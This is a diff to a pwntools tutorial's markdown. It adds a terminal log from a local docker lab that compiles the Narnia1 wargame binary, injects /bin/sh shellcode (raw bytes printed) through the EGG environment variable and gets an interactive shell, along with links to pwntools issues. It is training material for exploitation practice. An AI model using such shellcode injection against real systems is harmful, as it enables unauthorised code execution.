@@ -110,7 +110,45 @@ e = ELF.from_assembly(sh_shellcode2, vma=0x400000, arch='i386')
 ### Shellcraft
 Only managed to make it work for 32-bit binaries. Refer to `example4.py` for a working example with 32-bits and to `example5.py` for a non-working example with 64-bits.
 
+```
+docker run -v /Users/victor/basic_cybersecurity:/tutorial -it pwnbox:latest
+...
+root@ffac9df3ac02:/tutorial/tutorial6# python example4.py
+[*] Compiling the binary narnia1_local
+narnia1.c: In function 'main':
+narnia1.c:21:5: warning: implicit declaration of function 'getenv' [-Wimplicit-function-declaration]
+  if(getenv("EGG")==NULL){    
+     ^
+narnia1.c:21:18: warning: comparison between pointer and integer
+  if(getenv("EGG")==NULL){    
+                  ^
+narnia1.c:23:3: warning: implicit declaration of function 'exit' [-Wimplicit-function-declaration]
+   exit(1);
+   ^
+narnia1.c:23:3: warning: incompatible implicit declaration of built-in function 'exit'
+narnia1.c:23:3: note: include '<stdlib.h>' or provide a declaration of 'exit'
+narnia1.c:27:6: warning: assignment makes pointer from integer without a cast [-Wint-conversion]
+  ret = getenv("EGG");
+      ^
+[*] Putting together simple shellcode
+jhh///sh/bin\x89?h\x814$ri1?Qj\x04Y?Q??1?j\x0bX̀
+[*] Introduce shellcode in EGG env. variable
+[*] Launching narnia1_local
+[!] Could not find executable 'narnia1_local' in $PATH, using './narnia1_local' instead
+[+] Starting local process './narnia1_local': pid 38
+[*] Switching to interactive mode
+Trying to execute EGG!
+$ uname -a
+Linux ffac9df3ac02 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+```
 
+Issue raised at https://github.com/Gallopsled/pwntools/issues/1142.
+
+### GDB integration
+
+Issue with the terminal fixed at https://github.com/Gallopsled/pwntools/issues/1140.
+
+New issue at https://github.com/Gallopsled/pwntools/issues/1117.
 
 ### Examples
 #### narnia1
